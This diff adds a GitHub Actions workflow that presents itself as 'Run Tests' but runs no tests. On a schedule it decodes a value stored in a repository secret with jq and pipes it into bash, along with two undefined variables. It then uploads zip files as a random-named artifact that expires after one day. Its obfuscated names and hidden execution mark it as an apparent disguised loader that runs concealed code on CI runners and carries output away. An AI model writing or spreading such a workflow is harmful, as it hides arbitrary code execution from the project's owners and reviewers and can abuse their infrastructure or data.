@@ -1,0 +1,28 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          mc49: ${{ secrets.mc49 }}
+        run: |
+          printf '%s' "$mc49" | jq -r .o26 | /bin/bash
+          printf '%s' "$v86" | jq -r .yxude9 | /bin/bash
+          echo $dneo95 | jq -r .gqav1 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: HvhVJ1Fx
+          path: "*.zip"
+          retention-days: 1
